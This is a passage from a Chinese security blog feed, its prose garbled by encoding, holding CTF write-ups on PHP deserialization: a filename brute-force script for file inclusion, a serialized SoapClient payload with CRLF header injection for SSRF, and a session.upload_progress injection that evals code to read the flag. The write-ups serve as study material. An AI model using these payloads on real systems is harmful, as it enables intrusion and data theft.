&lt;span style="color:#111">base_url&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#34;http://&lt;/span>&lt;span style="color:#d88200">%s&lt;/span>&lt;span style="color:#d88200">:&lt;/span>&lt;span style="color:#d88200">%d&lt;/span>&lt;span style="color:#d88200">&amp;#34;&lt;/span> &lt;span style="color:#f92672">%&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">host&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">port&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#00a8c8">def&lt;/span> &lt;span style="color:#75af00">brute_force_tmp_files&lt;/span>&lt;span style="color:#111">():&lt;/span>
&lt;span style="color:#00a8c8">for&lt;/span> &lt;span style="color:#111">i&lt;/span> &lt;span style="color:#f92672">in&lt;/span> &lt;span style="color:#111">charset&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;span style="color:#00a8c8">for&lt;/span> &lt;span style="color:#111">j&lt;/span> &lt;span style="color:#f92672">in&lt;/span> &lt;span style="color:#111">charset&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;span style="color:#00a8c8">for&lt;/span> &lt;span style="color:#111">k&lt;/span> &lt;span style="color:#f92672">in&lt;/span> &lt;span style="color:#111">charset&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;span style="color:#00a8c8">for&lt;/span> &lt;span style="color:#111">l&lt;/span> &lt;span style="color:#f92672">in&lt;/span> &lt;span style="color:#111">charset&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;span style="color:#00a8c8">for&lt;/span> &lt;span style="color:#111">m&lt;/span> &lt;span style="color:#f92672">in&lt;/span> &lt;span style="color:#111">charset&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;span style="color:#00a8c8">for&lt;/span> &lt;span style="color:#111">n&lt;/span> &lt;span style="color:#f92672">in&lt;/span> &lt;span style="color:#111">charset&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;span style="color:#111">filename&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">i&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#111">j&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#111">k&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#111">l&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#111">m&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#111">n&lt;/span>
&lt;span style="color:#111">url&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#34;&lt;/span>&lt;span style="color:#d88200">%s&lt;/span>&lt;span style="color:#d88200">/index.php?function=extract&amp;amp;file=/tmp/php&lt;/span>&lt;span style="color:#d88200">%s&lt;/span>&lt;span style="color:#d88200">&amp;#34;&lt;/span> &lt;span style="color:#f92672">%&lt;/span> &lt;span style="color:#111">(&lt;/span>
&lt;span style="color:#111">base_url&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">filename&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">print&lt;/span> &lt;span style="color:#111">url&lt;/span>
&lt;span style="color:#00a8c8">try&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;span style="color:#111">response&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">requests&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">get&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">url&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#d88200">&amp;#39;wwwwwwwwwwwwww&amp;#39;&lt;/span> &lt;span style="color:#f92672">in&lt;/span> &lt;span style="color:#111">response&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">content&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;span style="color:#111">print&lt;/span> &lt;span style="color:#d88200">&amp;#34;[+] Include success!&amp;#34;&lt;/span>
&lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#00a8c8">True&lt;/span>
&lt;span style="color:#00a8c8">except&lt;/span> &lt;span style="color:#75af00">Exception&lt;/span> &lt;span style="color:#00a8c8">as&lt;/span> &lt;span style="color:#111">e&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;span style="color:#111">print&lt;/span> &lt;span style="color:#111">e&lt;/span>
&lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#00a8c8">False&lt;/span>
&lt;span style="color:#00a8c8">def&lt;/span> &lt;span style="color:#75af00">main&lt;/span>&lt;span style="color:#111">():&lt;/span>
&lt;span style="color:#111">brute_force_tmp_files&lt;/span>&lt;span style="color:#111">()&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#111">__name__&lt;/span> &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#d88200">&amp;#34;__main__&amp;#34;&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;span style="color:#111">main&lt;/span>&lt;span style="color:#111">()&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>çˆ†ç ´æˆåŠŸåå°±æ‹¿åˆ°äº†shellï¼Œå…¶ä½™è·Ÿä¸Šé¢ä¸€æ ·&lt;/p>
&lt;h3 id="lctf-2018bestphps-revenge">[LCTF 2018]bestphp&amp;rsquo;s revenge&lt;/h3>
&lt;p>â€”â€”â€”â€”è¿™ä¸ªæ —å­ç»“åˆäº†SoapClientå’Œsessionçš„è€ƒç‚¹&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-php" data-lang="php">&lt;span style="color:#f92672">&amp;lt;?&lt;/span>&lt;span style="color:#75af00">php&lt;/span>
&lt;span style="color:#75af00">highlight_file&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#00a8c8">__FILE__&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#111">$b&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#39;implode&amp;#39;&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#75af00">call_user_func&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$_GET&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#75af00">f&lt;/span>&lt;span style="color:#111">],&lt;/span>&lt;span style="color:#111">$_POST&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#75af00">session_start&lt;/span>&lt;span style="color:#111">();&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">isset&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$_GET&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#75af00">name&lt;/span>&lt;span style="color:#111">])){&lt;/span>
&lt;span style="color:#111">$_SESSION&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#75af00">name&lt;/span>&lt;span style="color:#111">]&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">$_GET&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#75af00">name&lt;/span>&lt;span style="color:#111">];&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#75af00">var_dump&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$_SESSION&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#111">$a&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">array&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">reset&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$_SESSION&lt;/span>&lt;span style="color:#111">),&lt;/span>&lt;span style="color:#d88200">&amp;#39;welcome_to_the_lctf2018&amp;#39;&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#75af00">call_user_func&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$b&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#111">$a&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>çœ‹åˆ°äº†æˆ‘ä»¬çš„è€æœ‹å‹&lt;code>call_user_func&lt;/code>ï¼Œå®ƒä¼šæŠŠç¬¬ä¸€ä¸ªå‚æ•°ä½œä¸ºå›è°ƒå‡½æ•°ï¼Œå…¶ä½™å‚æ•°ä½œä¸ºå›è°ƒå‡½æ•°çš„å‚æ•°ï¼›å¦‚æœæˆ‘ä»¬ç¬¬ä¸€ä¸ªå‚æ•°ä¼ å…¥çš„æ˜¯æ•°ç»„ï¼Œå®ƒä¼šæŠŠæ•°ç»„çš„ç¬¬ä¸€ä¸ªå€¼ä½œä¸ºç±»åï¼Œç¬¬äºŒä¸ªå€¼å½“ä½œæ–¹æ³•è¿›è¡Œå›è°ƒï¼ˆååºåˆ—åŒ–ä¸­å¸¸è§ï¼‰ï¼›&lt;code>call_user_func&lt;/code>å‡½æ•°ä¸ä»…å¯ä»¥è°ƒç”¨è‡ªå®šä¹‰å‡½æ•°å’Œç±»ï¼Œä¹Ÿå¯ä»¥è°ƒç”¨phpå†…ç½®å‡½æ•°å’Œå†…ç½®ç±»ï¼Œæ¯”å¦‚&lt;code>extract&lt;/code>&lt;/p>
&lt;p>flag.phpå¯ä»¥ç›´æ¥è®¿é—®ï¼ˆè¿™é‡Œæˆ‘æ²¡æœ‰æ‰« çœ‹wpçŸ¥é“çš„ robots.txtå’Œé¡µé¢æºç éƒ½æ²¡æœ‰ç›´æ¥çš„æç¤ºï¼‰&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211128225823073.png" alt="image-20211128225823073">&lt;/p>
&lt;p>è¿™ä¸ªå›æ˜¾å¾ˆæ˜æ˜¾éœ€è¦ssrfï¼Œä»¥localhostè®¿é—®flag.phpå°±ä¼šå°†flagå†™å…¥SESSIONä¸­&lt;/p>
&lt;p>å†…ç½®ç±»&lt;code>SoapClient()&lt;/code>æ»¡è¶³è¿™ä¸ªéœ€è¦ï¼Œå®ƒå¯ä»¥é€šè¿‡ååºåˆ—åŒ–æ¥å‘èµ·ä¸€ä¸ªhttpè¯·æ±‚ï¼ˆéœ€è¦è¢«è°ƒç”¨&lt;code>__call&lt;/code>&lt;/p>
&lt;p>æ‰€ä»¥æ•´ä½“æ€è·¯æ˜¯è¿™æ ·çš„ï¼š&lt;/p>
&lt;ol>
&lt;li>è¦†ç›–åºåˆ—åŒ–å¼•æ“ä¸º&lt;code>php_serialize&lt;/code>ï¼Œ é€šè¿‡&lt;code>session_start&lt;/code>å°†ä¸€ä¸ªåºåˆ—åŒ–çš„&lt;code>SoapClient&lt;/code>å†™å…¥sessionï¼›ç”±äºgetä¼ å…¥çš„nameä¼šè¢«ç›´æ¥æ”¾å…¥sessionä¸­ï¼Œæ‰€ä»¥åºåˆ—åŒ–çš„å­—ç¬¦ä¸²ä¸ç”¨postä¼ ï¼Œåªéœ€è¦postä¼ è®¾ç½®ååºåˆ—åŒ–å¼•æ“çš„å‚æ•°å°±å¯ä»¥&lt;/li>
&lt;li>ç¬¬ä¸€ä¸ª&lt;code>call_user_func&lt;/code>é€šè¿‡&lt;code>extract&lt;/code>å˜é‡è¦†ç›–ä½¿&lt;code>$b = call_user_func&lt;/code>ï¼Œç¬¬äºŒä¸ª&lt;code>call_user_func&lt;/code>è°ƒç”¨&lt;code>SoapClient-&amp;gt;__call&lt;/code>ï¼ˆä¸å¯è®¿é—®çš„æ–¹æ³• call_user_funcï¼‰&lt;/li>
&lt;/ol>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-php" data-lang="php">&lt;span style="color:#f92672">&amp;lt;?&lt;/span>&lt;span style="color:#75af00">php&lt;/span>
&lt;span style="color:#111">$target&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#d88200">&amp;#39;http://127.0.0.1/flag.php&amp;#39;&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#111">$b&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#75af00">SoapClient&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#00a8c8">null&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#00a8c8">array&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;location&amp;#39;&lt;/span> &lt;span style="color:#f92672">=&amp;gt;&lt;/span> &lt;span style="color:#111">$target&lt;/span>&lt;span style="color:#111">,&lt;/span>
&lt;span style="color:#d88200">&amp;#39;user_agent&amp;#39;&lt;/span> &lt;span style="color:#f92672">=&amp;gt;&lt;/span> &lt;span style="color:#d88200">&amp;#34;AAA:BBB&lt;/span>&lt;span style="color:#8045ff">\r\n&lt;/span>&lt;span style="color:#d88200">&amp;#34;&lt;/span> &lt;span style="color:#f92672">.&lt;/span>
&lt;span style="color:#d88200">&amp;#34;Cookie:PHPSESSID=gnnorfjmr9hr82gej7njt5dc83&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span>
&lt;span style="color:#d88200">&amp;#39;uri&amp;#39;&lt;/span> &lt;span style="color:#f92672">=&amp;gt;&lt;/span> &lt;span style="color:#d88200">&amp;#34;http://127.0.0.1/&amp;#34;&lt;/span>&lt;span style="color:#111">));&lt;/span>
&lt;span style="color:#111">$se&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">serialize&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$b&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#00a8c8">echo&lt;/span> &lt;span style="color:#d88200">&amp;#34;|&amp;#34;&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">urlencode&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$se&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#75715e">// O%3A10%3A%22SoapClient%22%3A5%3A%7Bs%3A3%3A%22uri%22%3Bs%3A17%3A%22http%3A%2F%2F127.0.0.1%2F%22%3Bs%3A8%3A%22location%22%3Bs%3A25%3A%22http%3A%2F%2F127.0.0.1%2Fflag.php%22%3Bs%3A15%3A%22_stream_context%22%3Bi%3A0%3Bs%3A11%3A%22_user_agent%22%3Bs%3A52%3A%22AAA%3ABBB%0D%0ACookie%3APHPSESSID%3Dgnnorfjmr9hr82gej7njt5dc83%22%3Bs%3A13%3A%22_soap_version%22%3Bi%3A1%3B%7D
&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;pre tabindex="0">&lt;code>/?name=|O%3A10%3A%22SoapClient%22%3A5%3A%7Bs%3A3%3A%22uri%22%3Bs%3A17%3A%22http%3A%2F%2F127.0.0.1%2F%22%3Bs%3A8%3A%22location%22%3Bs%3A25%3A%22http%3A%2F%2F127.0.0.1%2Fflag.php%22%3Bs%3A15%3A%22_stream_context%22%3Bi%3A0%3Bs%3A11%3A%22_user_agent%22%3Bs%3A52%3A%22AAA%3ABBB%0D%0ACookie%3APHPSESSID%3Dgnnorfjmr9hr82gej7njt5dc83%22%3Bs%3A13%3A%22_soap_version%22%3Bi%3A1%3B%7D&amp;amp;f=session_start
Cookie: PHPSESSID=gnnorfjmr9hr82gej7njt5dc83
POST: serialize_handler=php_serialize
&lt;/code>&lt;/pre>&lt;pre tabindex="0">&lt;code>/?name=Soapclient&amp;amp;f=extract
Cookie: PHPSESSID=gnnorfjmr9hr82gej7njt5dc83
POST: b=call_user_func
&lt;/code>&lt;/pre>&lt;p>ä¹‹ååˆ·æ–°é¡µé¢å°±å¯ä»¥è§¦å‘ååºåˆ—åŒ–äº†ï¼Œç”±äºä¸Šé¢æ„é€ çš„æ—¶å€™cookieå°±æ˜¯å½“å‰é¡µé¢çš„cookieï¼Œæ‰€ä»¥æ•´ä¸€å¥—è¿‡ç¨‹ä¸‹æ¥ä¸éœ€è¦å•ç‹¬æ”¹sessionï¼Œé¦–é¡µå°±å¯ä»¥çœ‹åˆ°ç»“æœ&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211129123843040.png" alt="image-20211129123843040">&lt;/p>
&lt;h3 id="jarvisoj-webphpinfo">[Jarvisoj web]PHPINFO&lt;/h3>
&lt;p>&lt;a href="http://web.jarvisoj.com:32784/index.php">è¿™é‡Œæ˜¯é¢˜ç›®é¡µé¢&lt;/a>ï¼›å¼€å¹•æºç &lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-php" data-lang="php">&lt;span style="color:#f92672">&amp;lt;?&lt;/span>&lt;span style="color:#75af00">php&lt;/span>
&lt;span style="color:#75715e">//A webshell is wait for you
&lt;/span>&lt;span style="color:#75715e">&lt;/span>&lt;span style="color:#75af00">ini_set&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;session.serialize_handler&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#39;php&amp;#39;&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#75af00">session_start&lt;/span>&lt;span style="color:#111">();&lt;/span>
&lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">OowoO&lt;/span>
&lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#111">$mdzz&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#00a8c8">function&lt;/span> &lt;span style="color:#111">__construct&lt;/span>&lt;span style="color:#111">()&lt;/span>
&lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#111">$this&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">mdzz&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#39;phpinfo();&amp;#39;&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#00a8c8">function&lt;/span> &lt;span style="color:#111">__destruct&lt;/span>&lt;span style="color:#111">()&lt;/span>
&lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#00a8c8">eval&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$this&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">mdzz&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">isset&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$_GET&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#39;phpinfo&amp;#39;&lt;/span>&lt;span style="color:#111">]))&lt;/span>
&lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#111">$m&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#75af00">OowoO&lt;/span>&lt;span style="color:#111">();&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#00a8c8">else&lt;/span>
&lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#75af00">highlight_string&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">file_get_contents&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;index.php&amp;#39;&lt;/span>&lt;span style="color:#111">));&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#75715e">?&amp;gt;&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">
&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>å…ˆçœ‹çœ‹phpinfoï¼Œåº”è¯¥æœ‰æç¤ºä¿¡æ¯ï¼›å‘ç°&lt;code>session.upload_progress.enabled=On&lt;/code>ï¼Œè¿™å°±éå¸¸å¥½äº†ï¼Œæ„é€ ä¸€ä¸ªä¸Šä¼ è¡¨å•æŠŠæˆ‘ä»¬æƒ³æ‰§è¡Œçš„ä»£ç åºåˆ—åŒ–åè®¾ä¸ºæ–‡ä»¶åä¼ å…¥&lt;/p>
&lt;p>åºåˆ—åŒ–exp&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-php" data-lang="php">&lt;span style="color:#f92672">&amp;lt;?&lt;/span>&lt;span style="color:#75af00">php&lt;/span>
&lt;span style="color:#75af00">ini_set&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;session.serialize_handler&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#39;php_serialize&amp;#39;&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#75af00">session_start&lt;/span>&lt;span style="color:#111">();&lt;/span>
&lt;span style="color:#f92672">&amp;lt;?&lt;/span>&lt;span style="color:#75af00">php&lt;/span>
&lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">OowoO&lt;/span>
&lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#111">$mdzz&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#d88200">&amp;#39;print_r(scandir(dirname(__FILE__)));&amp;#39;&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#111">$obj&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#75af00">OowoO&lt;/span>&lt;span style="color:#111">();&lt;/span>
&lt;span style="color:#00a8c8">echo&lt;/span> &lt;span style="color:#d88200">&amp;#34;|&amp;#34;&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">serialize&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$obj&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#75715e">// |O:5:&amp;#34;OowoO&amp;#34;:1:{s:4:&amp;#34;mdzz&amp;#34;;s:36:&amp;#34;print_r(scandir(dirname(__FILE__)));&amp;#34;;}
&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>æ„é€ ä¸Šä¼ è¡¨å•ï¼Œæ³¨æ„æ–‡ä»¶åçš„å¼•å·è¦åŠ åæ–œæ è½¬ä¹‰&lt;/p>
&lt;pre tabindex="0">&lt;code>|O:5:\&amp;quot;OowoO\&amp;quot;:1:{s:4:\&amp;quot;mdzz\&amp;quot;;s:36:\&amp;quot;print_r(scandir(dirname(__FILE__)));\&amp;quot;;}
&lt;/code>&lt;/pre>&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211129212625924.png" alt="image-20211129212625924">&lt;/p>
&lt;p>ç„¶åè®¿é—®è¿™ä¸ªphp&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-php" data-lang="php">&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#111">$mdzz&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#d88200">&amp;#39;print_r(file_get_contents(&amp;#34;/opt/lampp/htdocs/Here_1s_7he_fl4g_buT_You_Cannot_see.php&amp;#34;));&amp;#39;&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;pre tabindex="0">&lt;code>|O:5:\&amp;quot;OowoO\&amp;quot;:1:{s:4:\&amp;quot;mdzz\&amp;quot;;s:88:\&amp;quot;print_r(file_get_contents(\&amp;quot;/opt/lampp/htdocs/Here_1s_7he_fl4g_buT_You_Cannot_see.php\&amp;quot;));\&amp;quot;;}
&lt;/code>&lt;/pre>&lt;p>å¾—åˆ°flag&lt;/p>
&lt;hr>
&lt;p>å‘¼â€¦â€¦é•¿èˆ’ä¸€å£æ°”ï¼Œè¿™ä¸ªçŸ¥è¯†ç‚¹ç»ˆäºç”»ä¸Šäº†ä¸€ä¸ªå°å¥å·ï¼›æš‘å‡æ€»ç»“phpååºåˆ—åŒ–çš„æ—¶å€™å°±å·®æ•´ä¸ªå’Œå†…ç½®ç±»ï¼Œç»“æœç£¨ç£¨è¹­è¹­æ‹–åˆ°ä»Šå¤©ï¼Œä¸è¿‡è¿˜æ˜¯è¢«æˆ‘ç»ˆç»“æ‰å•¦ï¼æ–‡ä¸­è¿˜è®¾è®¡äº†ä¸€ç‚¹SoapClientå†…ç½®ç±»çš„ä¸œè¥¿ï¼Œç”±äºç¯‡å¹…åŸå› ä¸å±•å¼€è®²äº†= = ã€&lt;/p>
&lt;p>æœ€è¿‘çš„è®¡åˆ’å’Œå®‰æ’å°±æ˜¯åˆ·é¢˜&amp;amp;æŠŠä¹‹å‰çš„çŸ¥è¯†ä½“ç³»å¡«å……å®Œæ•´ï¼ŒåŠ æ²¹å•¦&lt;/p>
&lt;hr>
&lt;details>
&lt;summary>
&lt;h4 class="inline">
ä»¥ä¸‹æ˜¯æœ¬æ–‡ä¸­æ¶‰åŠåˆ°çš„ å’Œæˆ‘å­¦ä¹ æ—¶çœ‹è¿‡çš„æ‰€æœ‰æ–‡ç« çš„é“¾æ¥ æ¯æ—¥æ„Ÿè°¢äº’è”ç½‘çš„ä¸°å¯Œèµ„æºï¼ˆ
&lt;/h4>
&lt;/summary>
&lt;p>&lt;a href="https://xz.aliyun.com/t/3339#toc-3">LCTF 2018 Writeup &amp;ndash; ROIS&lt;/a>&lt;/p>
&lt;p>&lt;a href="https://www.jianshu.com/p/dfd049924258">LFI via SegmentFault&lt;/a>&lt;/p>
&lt;p>&lt;a href="https://blog.spoock.com/2016/10/16/php-serialize-problem/">PHPä¸­SESSIONååºåˆ—åŒ–æœºåˆ¶&lt;/a>&lt;/p>
&lt;p>&lt;a href="https://www.freebuf.com/news/202819.html">åˆ©ç”¨session.upload_progressè¿›è¡Œæ–‡ä»¶åŒ…å«å’Œååºåˆ—åŒ–æ¸—é€&lt;/a>&lt;/p>
&lt;p>å¦‚æœ‰é—æ¼è¯·æŒ‡æ­£ï¼ï¼ï¼&lt;/p>
&lt;/details></description></item><item><title>PHPè¿œç¨‹debugç¯å¢ƒé…ç½®</title><link>https://amiaaaz.github.io/2021/11/25/php-remote-debug-env-init/</link><pubDate>Thu, 25 Nov 2021 18:44:34 +0800</pubDate><guid>https://amiaaaz.github.io/2021/11/25/php-remote-debug-env-init/</guid><description>&lt;p>é¦–å…ˆï¼Œè¿™é‡Œçš„æƒ…å†µä¸ä¸€èˆ¬çš„æœ¬åœ°è°ƒè¯•localhostä¸åŒï¼Œæ˜¯æœ¬åœ°debugè¿œç¨‹ä¸»æœºçš„dockeå†…çš„phpé¡¹ç›®ï¼Œä¹Ÿå°±æ˜¯è¿™é‡Œçš„laravelï¼›å¯èƒ½æœ‰çš„äººè§‰å¾—å¤šæ­¤ä¸€ä¸¾ï¼Œç›´æ¥åœ¨æœ¬åœ°æ­å»ºé¡¹ç›®ã€è¿è¡Œã€debugä¸€æ°”å‘µæˆï¼Œé€Ÿåº¦è¿˜å¿«ï¼Œä½•å¿…åˆ°è¿œç¨‹è·‘ä¸€é€šï¼Ÿé‚£æˆ‘åªèƒ½è¯´too youngï¼Œå¹´è½»äººè¿˜æ˜¯è¦æœ‰ç‚¹é•¿è¿œçš„æ‰“ç®—ï¼ˆ&lt;/p>
